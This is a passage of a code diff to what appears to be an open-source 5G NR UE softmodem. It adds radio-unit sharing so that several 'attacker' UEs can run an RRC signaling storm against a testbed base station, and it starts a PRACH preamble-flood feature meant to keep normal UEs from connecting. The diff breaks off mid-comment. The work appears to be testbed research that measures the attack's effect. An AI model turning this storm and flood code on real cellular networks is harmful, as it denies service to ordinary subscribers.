@@ -1,0 +1,3437 @@
+diff --git a/executables/nr-ue-ru.c b/executables/nr-ue-ru.c
+index 95346ae..bea45d3 100644
+--- a/executables/nr-ue-ru.c
++++ b/executables/nr-ue-ru.c
+@@ -3,6 +3,8 @@
+  */
+ 
+ #include "nr-ue-ru.h"
++
++extern bool nr_rss_is_probe(int ue);
+ #include "nr-uesoftmodem.h"
+ #include "PHY/NR_UE_TRANSPORT/nr_transport_proto_ue.h"
+ #include "common/config/config_paramdesc.h"
+@@ -91,6 +93,536 @@ static nrUE_RU_params_t *nrue_rus;
+ openair0_config_t openair0_cfg_g[MAX_CARDS] = {};
+ static openair0_device_t openair0_dev[MAX_CARDS] = {};
+ 
++/* ---------------------------------------------------------------------------
++ * RU sharing between UE instances (RRC signaling storm reproducer, UE only).
++ *
++ * Upstream refuses this in nr-uesoftmodem.c: "cells map 1:1 to RUs and RU
++ * sharing is not implemented". The testbed DU exposes exactly one ZMQ port
++ * pair, so putting several attacker UEs on the same cell needs that rule
++ * relaxed.
++ *
++ * An external ZMQ broker was rejected: it would copy 23.04 MS/s * 8 B per
++ * direction a second time on a path that already runs about 6x slower than
++ * real time (see docs/MEASUREMENTS.md). Sharing inside the process keeps
++ * the number of ZMQ round trips per slot unchanged: one UE fetches each slot
++ * and the others receive a copy, and the uplink of all UEs is summed into a
++ * single device write. The gNB is never modified.
++ * -------------------------------------------------------------------------*/
++#define RSS_SHARE_MAX_ANT 4
++#define RSS_SHARE_WAIT_MS 100
++
++typedef struct {
++  bool active;
++  int n_ue;
++  pthread_mutex_t mtx;
++  pthread_cond_t cv;
++  /* downlink: one reader fills a ring, every UE has its own cursor.
++     A round-based copy was wrong: UEs do not always ask for the same chunk
++     size (syncInFrame() asks for its own unit), and handing back another UE's
++     sample count tripped "unitTransfer == res" in nr-ue.c:714 on the box
++     2026-10-20. Per-UE cursors give each UE exactly what it asked for, in
++     stream order. */
++  bool rd_fetching;
++  uint64_t rd_prod;                       /* absolute samples produced */
++  uint64_t rd_cons[MAX_NUM_NR_UE_INST];   /* absolute samples consumed per UE */
++  bool rd_joined[MAX_NUM_NR_UE_INST];     /* UE has taken part at least once */
++  openair0_timestamp_t rd_ts0;            /* device ts of absolute sample 0 */
++  bool rd_ts0_set;
++  c16_t *rd_ring[RSS_SHARE_MAX_ANT];
++  uint64_t rd_ring_sz;                    /* power of two */
++  /* uplink: accumulate every UE, then one device write */
++  uint64_t wr_round;
++  int wr_joined;
++  openair0_timestamp_t wr_ts;
++  int wr_nsamps;
++  int wr_nant;
++  int wr_flags;
++  int32_t *wr_acc[RSS_SHARE_MAX_ANT];
++  c16_t *wr_out[RSS_SHARE_MAX_ANT];
++  int wr_cap;
++  /* The device keeps one sample_count_ for the shared stream and discards any
++     write whose timestamp it has already passed. Per-UE read cursors let the
++     UEs drift, so a lagging UE submits a timestamp from the past and its
++     samples are dropped. These keep the emitted stream monotonic. */
++  openair0_timestamp_t wr_dev_ts;
++  bool wr_dev_ts_set;
++  uint64_t wr_flushes;
++  uint64_t wr_clamped;
++  openair0_timestamp_t wr_spread_max;
++  /* Observation only, always counted: does the shared stream ever submit a
++     batch timestamp older than the previous one? That is what
++     zmq_tx_channel::align() drops, so comparing wr_back against the
++     "Error, channel timeout" count tells us whether out-of-order batches are
++     the cause or whether the drops come from somewhere else. */
++  openair0_timestamp_t wr_prev_ts;
++  bool wr_prev_ts_set;
++  uint64_t wr_back;
++  openair0_timestamp_t wr_back_max;
++  /* one device write per stream window: end of the last emitted window and how
++     many late writes were dropped locally instead of being sent backwards. */
++  /* The device write must not run under the shared mutex: while one instance
++     transmits, the other cannot even read. Two alternating staging buffers let
++     the next batch be merged while the current one is on the wire; tx_mtx keeps
++     the writes in order. The read path already releases the mutex around
++     trx_read_func for the same reason. */
++  pthread_mutex_t tx_mtx;
++  c16_t *wr_tx[2][RSS_SHARE_MAX_ANT];
++  int wr_tx_idx;
++  bool wr_emitted_set;
++  openair0_timestamp_t wr_emitted_end;
++  uint64_t wr_late_drop;
++  uint64_t rd_lockstep_waits;
++  uint64_t rd_lockstep_bail;
++} rss_ru_share_t;
++
++static rss_ru_share_t rss_share = {.mtx = PTHREAD_MUTEX_INITIALIZER,
++                                   .tx_mtx = PTHREAD_MUTEX_INITIALIZER,
++                                   .cv = PTHREAD_COND_INITIALIZER};
++
++bool nrue_ru_sharing_enabled(void)
++{
++  return NB_UE_INST > 1;
++}
++
++void nrue_ru_sharing_init(void)
++{
++  if (!nrue_ru_sharing_enabled())
++    return;
++  rss_share.active = true;
++  /* The lockstep batch is emitted when wr_joined reaches n_ue, so an instance
++     that does not transmit holds the batch back. A probe instance (rss probe_ues)
++     connects normally and then goes idle, which collapsed the storm from ~61/s
++     to 1.7/s when measured 2026-10-22. Override n_ue with the number of
++     instances that actually storm so the probe does not gate the batch. */
++  rss_share.n_ue = NB_UE_INST;
++  {
++    const char *env = getenv("RSS_SHARE_NUE");
++    if (env) {
++      const int n = atoi(env);
++      if (n >= 1 && n <= NB_UE_INST)
++        rss_share.n_ue = n;
++    }
++  }
++  /* cursors start lazily: each UE joins the stream at the current head */
++  LOG_W(HW, "[RSS] RU sharing enabled: %d UE instances on one radio\n", rss_share.n_ue);
++}
++
++/* Bounded wait: a UE that stops producing must degrade the run, not hang it. */
++static void rss_share_wait(void)
++{
++  struct timespec ts;
++  clock_gettime(CLOCK_REALTIME, &ts);
++  ts.tv_nsec += RSS_SHARE_WAIT_MS * 1000000L;
++  if (ts.tv_nsec >= 1000000000L) {
++    ts.tv_sec += 1;
++    ts.tv_nsec -= 1000000000L;
++  }
++  pthread_cond_timedwait(&rss_share.cv, &rss_share.mtx, &ts);
++}
++
++/* Short bounded wait for the lockstep gate below. Caller holds the mutex. */
++static void rss_share_wait_us(long us)
++{
++  struct timespec ts;
++  clock_gettime(CLOCK_REALTIME, &ts);
++  ts.tv_nsec += us * 1000L;
++  while (ts.tv_nsec >= 1000000000L) {
++    ts.tv_sec += 1;
++    ts.tv_nsec -= 1000000000L;
++  }
++  pthread_cond_timedwait(&rss_share.cv, &rss_share.mtx, &ts);
++}
++
++/* 1 = hold the per-UE downlink cursors together (default).
++ *
++ * Why: the device keeps one sample_count_ for the shared uplink stream and
++ * discards any write whose timestamp it has already passed. Free-running
++ * cursors leave the UEs at different stream positions, so each UE stamps its
++ * uplink with its own timestamp, the batch key (timestamp, nsamps, nant) stops
++ * matching, and the device sees timestamps going backwards. Box-measured
++ * 2026-10-20, 4 UE, 60 s: 8.06% of batches out of order (worst 34560 samples
++ * back) and 23322 "Error, channel timeout", i.e. about 17% of writes discarded.
++ *
++ * With the gate a UE only proceeds while no other UE is behind it, so all of
++ * them ask for the same window, the batch merges into one ordered write per
++ * slot, and nothing is dropped. RSS_SHARE_LOCKSTEP=0 restores free-running
++ * cursors for comparison in the same binary. */
++static bool rss_share_lockstep(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_SHARE_LOCKSTEP");
++    cached = env ? (atoi(env) != 0) : 1;
++  }
++  return cached != 0;
++}
++
++/* Upper bound on one lockstep wait, so a stalled instance cannot freeze the
++ * others. 50 x 200 us = 10 ms, one radio frame. */
++/* Bounded wait for the other instance to join the open uplink batch, so the
++ * batch merges into ONE device write instead of being emitted twice. */
++#define RSS_WR_JOIN_SLICE_US 100
++#define RSS_WR_JOIN_GUARD 4
++
++/* How far an instance may run ahead of the slowest one before the gate holds
++ * it, in samples. Zero is the original behaviour: hold on ANY lead, which makes
++ * every instance wait for unanimity. Box-measured 2026-10-21: lockstep waits
++ * grew to 1,344,986 at 8 UE and the attempt rate fell to 42.8/s (from 60.2/s at
++ * 6 UE), i.e. the unanimity gate, not sample loss, is what caps instance count
++ * (channel timeouts were only 277 in that run). One slot is 11520 samples at
++ * 23.04 MS/s with 30 kHz SCS. The late-drop guard in rss_shared_write keeps a
++ * wider window from reviving the discard cascade. */
++static uint64_t rss_lockstep_window(void)
++{
++  static long cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_LOCKSTEP_WINDOW");
++    cached = env ? atol(env) : 11520;
++    if (cached < 0)
++      cached = 0;
++  }
++  return (uint64_t)cached;
++}
++
++#define RSS_LOCKSTEP_SLICE_US 200
++#define RSS_LOCKSTEP_GUARD 50
++
++#define RSS_RING_SAMPLES (1u << 21) /* ~2M samples/antenna, 8 MB as c16_t */
++
++/* Lowest cursor among UEs that have started consuming. Caller holds the mutex. */
++static uint64_t rss_min_cons(const rss_ru_share_t *s)
++{
++  uint64_t m = s->rd_prod;
++  bool any = false;
++  for (int i = 0; i < MAX_NUM_NR_UE_INST; i++) {
++    if (!s->rd_joined[i])
++      continue;
++    any = true;
++    if (s->rd_cons[i] < m)
++      m = s->rd_cons[i];
++  }
++  return any ? m : s->rd_prod;
++}
++
++/* Lowest cursor among the OTHER joined UEs, or UINT64_MAX if there are none.
++ * Caller holds the mutex. */
++static uint64_t rss_min_cons_other(const rss_ru_share_t *s, int self)
++{
++  uint64_t m = UINT64_MAX;
++  for (int i = 0; i < MAX_NUM_NR_UE_INST; i++) {
++    if (i == self || !s->rd_joined[i])
++      continue;
++    if (s->rd_cons[i] < m)
++      m = s->rd_cons[i];
++  }
++  return m;
++}
++
++static int rss_joined_count(const rss_ru_share_t *s)
++{
++  int n = 0;
++  for (int i = 0; i < MAX_NUM_NR_UE_INST; i++)
++    if (s->rd_joined[i])
++      n++;
++  return n;
++}
++
++static int rss_shared_read(PHY_VARS_NR_UE *UE, openair0_timestamp_t *ptimestamp, void **buff, int nsamps, int nant)
++{
++  rss_ru_share_t *s = &rss_share;
++  const int id = UE->Mod_id;
++  AssertFatal(nant <= RSS_SHARE_MAX_ANT, "RU sharing supports at most %d antennas\n", RSS_SHARE_MAX_ANT);
++  AssertFatal(id >= 0 && id < MAX_NUM_NR_UE_INST, "bad UE instance %d\n", id);
++  AssertFatal((uint64_t)nsamps < RSS_RING_SAMPLES / 2, "read of %d samples exceeds the shared ring\n", nsamps);
++
++  pthread_mutex_lock(&s->mtx);
++  if (s->rd_ring_sz == 0) {
++    for (int a = 0; a < RSS_SHARE_MAX_ANT; a++)
++      s->rd_ring[a] = calloc_or_fail(RSS_RING_SAMPLES, sizeof(c16_t));
++    s->rd_ring_sz = RSS_RING_SAMPLES;
++  }
++  if (!s->rd_joined[id]) {
++    /* join at the current head so a late UE does not replay history */
++    s->rd_cons[id] = s->rd_prod;
++    s->rd_joined[id] = true;
++    /* Once every instance has joined, snap them all to the same position.
++       Each UE joins at whatever head existed when it finished cell search, so
++       without this they keep a constant offset for the rest of the run and
++       every slot produces one uplink batch per UE instead of one merged
++       batch. */
++    if (rss_share_lockstep() && rss_joined_count(s) == s->n_ue) {
++      for (int i = 0; i < MAX_NUM_NR_UE_INST; i++)
++        if (s->rd_joined[i])
++          s->rd_cons[i] = s->rd_prod;
++      LOG_I(HW, "[RSS] shared RX: %d UE joined, cursors aligned at %lu\n", s->n_ue, (unsigned long)s->rd_prod);
++    }
++  }
++
++  /* Lockstep gate: proceed only while no other UE is behind us. */
++  if (rss_share_lockstep() && s->n_ue > 1) {
++    int guard = 0;
++    for (;;) {
++      uint64_t other = rss_min_cons_other(s, id);
++      if (other == UINT64_MAX || s->rd_cons[id] <= other + rss_lockstep_window())
++        break;
++      if (guard++ >= RSS_LOCKSTEP_GUARD) {
++        s->rd_lockstep_bail++;
++        break;
++      }
++      s->rd_lockstep_waits++;
++      rss_share_wait_us(RSS_LOCKSTEP_SLICE_US);
++    }
++  }
++
++  while (s->rd_prod - s->rd_cons[id] < (uint64_t)nsamps) {
++    /* room is bounded by the slowest consumer, so nobody loses samples */
++    uint64_t room = s->rd_ring_sz - (s->rd_prod - rss_min_cons(s));
++    if (!s->rd_fetching && room >= (uint64_t)nsamps) {
++      s->rd_fetching = true;
++      uint64_t head = s->rd_prod;
++      int want = nsamps;
++      /* never wrap inside one device read */
++      uint64_t off = head & (s->rd_ring_sz - 1);
++      if (off + (uint64_t)want > s->rd_ring_sz)
++        want = (int)(s->rd_ring_sz - off);
++      void *tgt[RSS_SHARE_MAX_ANT];
++      for (int a = 0; a < nant; a++)
++        tgt[a] = s->rd_ring[a] + off;
++      pthread_mutex_unlock(&s->mtx);
++      openair0_device_t *dev = &openair0_dev[UE->rf_map.card];
++      openair0_timestamp_t tmp = 0;
++      int got = dev->trx_read_func(dev, &tmp, tgt, want, nant);
++      pthread_mutex_lock(&s->mtx);
++      if (!dev->firstTS_initialized) {
++        dev->firstTS = tmp;
++        dev->firstTS_initialized = true;
++      }
++      if (!s->rd_ts0_set) {
++        s->rd_ts0 = tmp - dev->firstTS; /* ts of absolute sample 0 */
++        s->rd_ts0_set = true;
++      }
++      if (got > 0)
++        s->rd_prod += (uint64_t)got;
++      s->rd_fetching = false;
++      pthread_cond_broadcast(&s->cv);
++    } else {
++      rss_share_wait();
++    }
++  }
++
++  uint64_t off = s->rd_cons[id] & (s->rd_ring_sz - 1);
++  int first = (int)((off + (uint64_t)nsamps > s->rd_ring_sz) ? (s->rd_ring_sz - off) : (uint64_t)nsamps);
++  for (int a = 0; a < nant; a++) {
++    c16_t *dst = (c16_t *)buff[a];
++    memcpy(dst, s->rd_ring[a] + off, (size_t)first * sizeof(c16_t));
++    if (first < nsamps)
++      memcpy(dst + first, s->rd_ring[a], (size_t)(nsamps - first) * sizeof(c16_t));
++  }
++  *ptimestamp = s->rd_ts0 + (openair0_timestamp_t)s->rd_cons[id];
++  s->rd_cons[id] += (uint64_t)nsamps;
++  pthread_cond_broadcast(&s->cv);
++  pthread_mutex_unlock(&s->mtx);
++  return nsamps;
++}
++
++/* Clamp a late shared-uplink batch forward instead of letting the device drop
++ * it. DEFAULT OFF: box-measured 2026-10-20, 4 UE, 60 s.
++ *
++ *   off: 2387 attempts, 21178 "Error, channel timeout", 140000 flushes
++ *   on :   32 attempts,     0 "Error, channel timeout", 180000 flushes,
++ *          179997 clamped (100%), worst lag 1403212303 samples
++ *
++ * The clamp advances its own counter by nsamps per flush, which assumes one
++ * flush per slot. There are more (140k-180k flushes in 60 s against ~120k
++ * slots), so the counter ran away from the real stream and every write landed
++ * in the far future. Kept as a documented negative result, not a fix. */
++static bool rss_share_wr_monotonic(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_SHARE_WR_MONOTONIC");
++    cached = env ? (atoi(env) != 0) : 0;
++  }
++  return cached != 0;
++}
++
++/* Push the open uplink batch to the radio. Caller holds the mutex. */
++static void rss_flush_locked(PHY_VARS_NR_UE *UE)
++{
++  rss_ru_share_t *s = &rss_share;
++  if (s->wr_joined == 0)
++    return;
++  for (int a = 0; a < s->wr_nant; a++) {
++    const int32_t *acc = s->wr_acc[a];
++    c16_t *out = s->wr_out[a];
++    for (int i = 0; i < s->wr_nsamps; i++) {
++      int32_t re = acc[2 * i];
++      int32_t im = acc[2 * i + 1];
++      out[i].r = re > INT16_MAX ? INT16_MAX : (re < INT16_MIN ? INT16_MIN : (int16_t)re);
++      out[i].i = im > INT16_MAX ? INT16_MAX : (im < INT16_MIN ? INT16_MIN : (int16_t)im);
++    }
++  }
++  openair0_device_t *dev = &openair0_dev[UE->rf_map.card];
++  void *tgt[RSS_SHARE_MAX_ANT];
++  for (int a = 0; a < s->wr_nant; a++)
++    tgt[a] = s->wr_out[a];
++
++  /* Keep the emitted timestamps monotonic.
++   *
++   * zmq_tx_channel::align() returns "timestamp passed" from its very first
++   * branch (sample_count_ > timestamp), before its timeout argument is ever
++   * used, and zmq_tx_stream::transmit() then logs "Error, channel timeout" and
++   * returns without sending. So the upstream TRANSMIT_TS_ALIGN_TIMEOUT is not
++   * the knob for this: a backwards timestamp is dropped no matter how long the
++   * timeout is. Box-measured drops before this change, 60 s runs:
++   * 0 / 5,136 / 14,718 / 39,765 at 1 / 2 / 3 / 4 UE.
++   *
++   * Clamping a late batch forward puts those samples in the current slot
++   * instead of discarding them. RSS_SHARE_WR_MONOTONIC=0 restores the old
++   * behaviour for comparison in the same binary. */
++  if (s->wr_prev_ts_set && s->wr_ts < s->wr_prev_ts) {
++    s->wr_back++;
++    if (s->wr_prev_ts - s->wr_ts > s->wr_back_max)
++      s->wr_back_max = s->wr_prev_ts - s->wr_ts;
++  }
++  s->wr_prev_ts = s->wr_ts;
++  s->wr_prev_ts_set = true;
++
++  s->wr_emitted_end = s->wr_ts + (openair0_timestamp_t)s->wr_nsamps;
++  s->wr_emitted_set = true;
++
++  openair0_timestamp_t ts = s->wr_ts;
++  if (rss_share_wr_monotonic()) {
++    if (s->wr_dev_ts_set && ts < s->wr_dev_ts) {
++      if (s->wr_dev_ts - ts > s->wr_spread_max)
++        s->wr_spread_max = s->wr_dev_ts - ts;
++      ts = s->wr_dev_ts;
++      s->wr_clamped++;
++    }
++    s->wr_dev_ts_set = true;
++    s->wr_dev_ts = ts + s->wr_nsamps;
++  }
++  /* Stage the merged samples, close the batch, then transmit with the shared
++     mutex released so the other instance can keep reading. */
++  const int bi = s->wr_tx_idx;
++  s->wr_tx_idx ^= 1;
++  void *txt[RSS_SHARE_MAX_ANT];
++  for (int a = 0; a < s->wr_nant; a++) {
++    memcpy(s->wr_tx[bi][a], s->wr_out[a], (size_t)s->wr_nsamps * sizeof(c16_t));
++    txt[a] = s->wr_tx[bi][a];
++  }
++  const int tx_nsamps = s->wr_nsamps, tx_nant = s->wr_nant, tx_flags = s->wr_flags;
++  const openair0_timestamp_t tx_ts = ts + dev->firstTS;
++  s->wr_joined = 0;
++  s->wr_round++;
++  pthread_cond_broadcast(&s->cv);
++  /* tx_mtx is taken while mtx is still held, so transmits keep batch order; it
++     is released before mtx is retaken, so there is no lock inversion. */
++  pthread_mutex_lock(&s->tx_mtx);
++  pthread_mutex_unlock(&s->mtx);
++  dev->trx_write_func(dev, tx_ts, txt, tx_nsamps, tx_nant, tx_flags);
++  pthread_mutex_unlock(&s->tx_mtx);
++  pthread_mutex_lock(&s->mtx);
++  if ((++s->wr_flushes % 20000) == 0)
++    LOG_I(HW,
++          "[RSS] shared TX: %lu flushes, %lu out of order (%.2f%%, worst %ld samples back), "
++          "%lu clamped, %lu late-drop, lockstep %lu waits / %lu bail, %d UE\n",
++          (unsigned long)s->wr_flushes,
++          (unsigned long)s->wr_back,
++          100.0 * (double)s->wr_back / (double)s->wr_flushes,
++          (long)s->wr_back_max,
++          (unsigned long)s->wr_clamped,
++          (unsigned long)s->wr_late_drop,
++          (unsigned long)s->rd_lockstep_waits,
++          (unsigned long)s->rd_lockstep_bail,
++          s->n_ue);
++  if (s->wr_flushes % 20000 == 0)
++    LOG_I(HW, "[RSS] lockstep window %lu samples\n", (unsigned long)rss_lockstep_window());
++}
++
++/* Sum the uplink of every sharing UE into one device write.
++ *
++ * A batch is keyed by (timestamp, nsamps, nant); without that key the batches
++ * mixed across slots as soon as more than two UEs ran. The function always
++ * returns nsamps because the device write is aggregated, so the per-caller
++ * contract is "your samples were accepted". */
++static int rss_shared_write(PHY_VARS_NR_UE *UE, openair0_timestamp_t timestamp, void **buff, int nsamps, int nant, int flags)
++{
++  rss_ru_share_t *s = &rss_share;
++  AssertFatal(nant <= RSS_SHARE_MAX_ANT, "RU sharing supports at most %d antennas\n", RSS_SHARE_MAX_ANT);
++
++  pthread_mutex_lock(&s->mtx);
++  if (s->wr_cap < nsamps) {
++    rss_flush_locked(UE); /* old buffers are about to go away */
++    for (int a = 0; a < RSS_SHARE_MAX_ANT; a++) {
++      free(s->wr_acc[a]);
++      free(s->wr_out[a]);
++      s->wr_acc[a] = calloc_or_fail(2 * nsamps, sizeof(int32_t));
++      s->wr_out[a] = calloc_or_fail(nsamps, sizeof(c16_t));
++      for (int b = 0; b < 2; b++) {
++        free(s->wr_tx[b][a]);
++        s->wr_tx[b][a] = calloc_or_fail(nsamps, sizeof(c16_t));
++      }
++    }
++    s->wr_cap = nsamps;
++  }
++
++  /* Emission is monotonic by construction: one device write per stream window.
++   *
++   * A write that lands inside a window we already emitted is dropped here. The
++   * device would discard it anyway (zmq_tx_channel::align() reports "timestamp
++   * passed" and transmit() logs "Error, channel timeout"), but on the way it
++   * zero-pads and jumps sample_count_ forward, which pushes the following
++   * writes into the past as well. That cascade is why 6.9% out-of-order
++   * batches produced 13.8% discarded writes, box-measured 2026-10-21 over a
++   * 600 s run at 2 UE: 245,426 discards of 1,780,000 flushes, air/wall 1.26
++   * against 2.39-2.46 for a single instance.
++   *
++   * This is NOT RSS_SHARE_WR_MONOTONIC, which was refuted: no timestamp is
++   * rewritten and sample_count_ is never advanced artificially. */
++  if (s->wr_emitted_set && timestamp < s->wr_emitted_end) {
++    s->wr_late_drop++;
++    pthread_mutex_unlock(&s->mtx);
++    return nsamps;
++  }
++
++  /* A write that does not belong to the open batch closes it first, but give
++     the other instance a bounded moment to join so the two merge into one
++     write instead of one write each. */
++  /* The bounded join wait was measured and REFUTED on the box 2026-10-21:
++     waiting up to 400 us on each key mismatch collapsed the attempt rate from
++     35.4/s to 3.3/s and raised discards, because it stalls the writer thread
++     the DU is waiting on. Flush immediately instead. */
++  if (s->wr_joined > 0 && (s->wr_ts != timestamp || s->wr_nsamps != nsamps || s->wr_nant != nant))
++    rss_flush_locked(UE);
++
++  if (s->wr_joined == 0) {
++    for (int a = 0; a < nant; a++)
++      memset(s->wr_acc[a], 0, 2 * (size_t)nsamps * sizeof(int32_t));
++    s->wr_ts = timestamp;
++    s->wr_nsamps = nsamps;
++    s->wr_nant = nant;
++    s->wr_flags = flags;
++  }
++
++  for (int a = 0; a < nant; a++) {
++    const c16_t *src = (const c16_t *)buff[a];
++    int32_t *acc = s->wr_acc[a];
++    for (int i = 0; i < nsamps; i++) {
++      acc[2 * i] += src[i].r;
++      acc[2 * i + 1] += src[i].i;
++    }
++  }
++  s->wr_joined++;
++
++  if (s->wr_joined >= s->n_ue)
++    rss_flush_locked(UE);
++
++  pthread_mutex_unlock(&s->mtx);
++  return nsamps;
++}
++
++
+ int nrue_get_cell_count(void)
+ {
+   return nrue_cell_count;
+@@ -368,6 +900,15 @@ void nrue_ru_end(void)
+ 
+ void nrue_ru_set_freq(PHY_VARS_NR_UE *UE, uint64_t ul_carrier, uint64_t dl_carrier, int freq_offset)
+ {
++  if (rss_share.active) {
++    /* All shared UEs stay on the same radio; do not migrate or re-own cells. */
++    openair0_config_t *scfg = &openair0_cfg_g[UE->rf_map.card];
++    openair0_device_t *sdev = &openair0_dev[UE->rf_map.card];
++    nr_rf_card_config_freq(scfg, ul_carrier, dl_carrier, freq_offset);
++    if (UE->Mod_id == 0)
++      sdev->trx_set_freq_func(sdev, scfg);
++    return;
++  }
+   int current_cell_id = nrue_rus[UE->rf_map.card].used_by_cell;
+   NR_DL_FRAME_PARMS *fp0 = &nrue_cell_fp[current_cell_id];
+   uint64_t dl_carrier_distance =
+@@ -430,6 +971,8 @@ int nrue_ru_adjust_rx_gain(PHY_VARS_NR_UE *UE, int gain_change)
+ 
+ int nrue_ru_read(PHY_VARS_NR_UE *UE, openair0_timestamp_t *ptimestamp, void **buff, int nsamps, int num_antennas)
+ {
++  if (rss_share.active)
++    return rss_shared_read(UE, ptimestamp, buff, nsamps, num_antennas);
+   openair0_device_t *dev = &openair0_dev[UE->rf_map.card];
+   openair0_timestamp_t tmp_timestamp;
+   int ret = dev->trx_read_func(dev, &tmp_timestamp, buff, nsamps, num_antennas);
+@@ -470,6 +1013,8 @@ int nrue_ru_read(PHY_VARS_NR_UE *UE, openair0_timestamp_t *ptimestamp, void **bu
+ 
+ int nrue_ru_write(PHY_VARS_NR_UE *UE, openair0_timestamp_t timestamp, void **buff, int nsamps, int num_antennas, int flags)
+ {
++  if (rss_share.active)
++    return rss_shared_write(UE, timestamp, buff, nsamps, num_antennas, flags);
+   openair0_device_t *dev = &openair0_dev[UE->rf_map.card];
+   int ret = dev->trx_write_func(dev, timestamp + dev->firstTS, buff, nsamps, num_antennas, flags);
+ 
+@@ -500,6 +1045,10 @@ int nrue_ru_write(PHY_VARS_NR_UE *UE, openair0_timestamp_t timestamp, void **buf
+ 
+ int nrue_ru_write_reorder(PHY_VARS_NR_UE *UE, openair0_timestamp_t timestamp, void **txp, int nsamps, int nbAnt, int flags)
+ {
++  /* The reorder context lives in the device and assumes a single writer.
++     With shared RU the summing path already serialises the device write. */
++  if (rss_share.active)
++    return rss_shared_write(UE, timestamp, txp, nsamps, nbAnt, flags);
+   openair0_device_t *device = &openair0_dev[UE->rf_map.card];
+   return openair0_write_reorder_common(nrue_ru_write, UE, device, timestamp, txp, nsamps, nbAnt, flags);
+ }
+diff --git a/executables/nr-ue-ru.h b/executables/nr-ue-ru.h
+index 7d0836c..ab1b10f 100644
+--- a/executables/nr-ue-ru.h
++++ b/executables/nr-ue-ru.h
+@@ -31,4 +31,11 @@ int nrue_ru_write(PHY_VARS_NR_UE *UE, openair0_timestamp_t timestamp, void **buf
+ int nrue_ru_write_reorder(PHY_VARS_NR_UE *UE, openair0_timestamp_t timestamp, void **txp, int nsamps, int nbAnt, int flags);
+ void nrue_ru_write_reorder_clear_context(PHY_VARS_NR_UE *UE);
+ 
++
++/* RU sharing between UE instances (RRC storm reproducer, UE side only).
++   Upstream maps one UE to one cell and one cell to one RU. Enabled when
++   --num-ues > 1 so several attacker UEs can use the single DU ZMQ port pair. */
++bool nrue_ru_sharing_enabled(void);
++void nrue_ru_sharing_init(void);
++
+ #endif
+diff --git a/executables/nr-uesoftmodem.c b/executables/nr-uesoftmodem.c
+index 4a9749e..e1f86e1 100644
+--- a/executables/nr-uesoftmodem.c
++++ b/executables/nr-uesoftmodem.c
+@@ -398,7 +398,10 @@ int main(int argc, char **argv)
+                   nrue_get_cell_count());
+       nrUE_cell_params_t cell = *nrue_get_cell(cell_id);
+ 
+-      AssertFatal(cell.used_by_ue == -1,
++      /* RU sharing (RRC storm reproducer): several attacker UEs must use the
++         one cell the testbed DU exposes, so the 1:1 rule is relaxed and the
++         samples are shared in nr-ue-ru.c. */
++      AssertFatal(cell.used_by_ue == -1 || nrue_ru_sharing_enabled(),
+                   "Cell %d is already used by UE %d and cannot also be used by UE %d as cells map 1:1 to RUs and RU sharing is not implemented\n",
+                   cell_id,
+                   cell.used_by_ue,
+@@ -454,10 +457,12 @@ int main(int argc, char **argv)
+         sl_ue_phy_init(UE_CC);
+       }
+ 
+-      cell_id++; // initially connect each UE and carrier to its own cell
++      if (!nrue_ru_sharing_enabled())
++        cell_id++; // initially connect each UE and carrier to its own cell
+     }
+   }
+ 
++  nrue_ru_sharing_init();
+   nrue_init_openair0();
+ 
+   lock_memory_to_ram();
+diff --git a/openair1/PHY/NR_UE_TRANSPORT/nr_prach.c b/openair1/PHY/NR_UE_TRANSPORT/nr_prach.c
+index 519737b..6d4c023 100644
+--- a/openair1/PHY/NR_UE_TRANSPORT/nr_prach.c
++++ b/openair1/PHY/NR_UE_TRANSPORT/nr_prach.c
+@@ -6,6 +6,7 @@
+  * \brief Routines for UE PRACH physical channel
+  */
+ #include "PHY/sse_intrin.h"
++#include <pthread.h>
+ #include "PHY/impl_defs_nr.h"
+ #include "PHY/defs_nr_UE.h"
+ #include "PHY/NR_UE_TRANSPORT/nr_transport_proto_ue.h"
+@@ -25,6 +26,83 @@
+ // - idft for short sequence assumes we are transmitting starting in symbol 0 of a PRACH slot
+ // - Assumes that PRACH SCS is same as PUSCH SCS @ 30 kHz, take values for formats 0-2 and adjust for others below
+ // - Preamble index different from 0 is not detected by gNB
++/* RSS: emit several PRACH preambles in one occasion.
++   A normal UE must clear three gates to connect: PRACH/RA, Msg3 contention
++   resolution, and RRC admission. The reproducer only ever attacked the third
++   (SR/CSI ceiling 96), where the achievable ceiling dwell is 35.1% - a normal
++   UE still gets in within a few attempts. The first gate is independent of the
++   admission ceiling.
++   Preambles are Zadoff-Chu sequences that are code-division multiplexed, so N
++   preambles coexisting in one occasion is exactly what N separate UEs produce.
++   Measured on this cell: NCS == 0, so preamble_offset == preamble_index and
++   preamble_shift == 0, and X_u is dimensioned [64][839], so every contention
++   preamble index maps to its own root sequence and all 64 are in range.
++   Power is the real constraint: one UE's samples are int16, so N full-amplitude
++   sequences clip, while dividing by N drops each correlation peak below the
++   gNB's detection threshold. RSS_FLOOD_DIV separates the two so the usable
++   region can be measured instead of guessed.
++   RSS_PREAMBLE_FLOOD <= 1 keeps the upstream single-preamble path exactly. */
++/* Probe instances must behave as ordinary UEs, so they never flood: the knob
++   is process-wide and would otherwise make the measurement instrument emit
++   four preambles too, which cannot be told apart from the attack denying it. */
++extern bool nr_rss_is_probe(int ue);
++
++static int rss_preamble_flood(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_PREAMBLE_FLOOD");
++    cached = env ? atoi(env) : 0;
++    if (cached < 0)
++      cached = 0;
++    if (cached > 64)
++      cached = 64;
++  }
++  return cached;
++}
++
++static int rss_flood_div(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_FLOOD_DIV");
++    cached = env ? atoi(env) : 1;
++    if (cached < 1)
++      cached = 1;
++  }
++  return cached;
++}
++
++/* Per-preamble time-domain waveform cache, second attempt.
++   The waveform for a preamble index is fixed once the cell config and the
++   transmit amplitude are fixed, so the idft need not be redone every occasion.
++   The first attempt used calloc() and a pthread mutex inside the real-time TX
++   callback and produced "Timeout waiting for TX path to align samples" plus a
++   core dump even at FLOOD=4 (box-measured 2026-10-22), so it was reverted and
++   the compute hypothesis was left untested rather than refuted.
++   This version removes both hazards: a static BSS array (no allocation) and a
++   lock-free fill. The race is benign - two threads computing the same
++   deterministic samples - and `ready` is only published after the samples are
++   written, so a reader either sees the finished waveform or recomputes it.
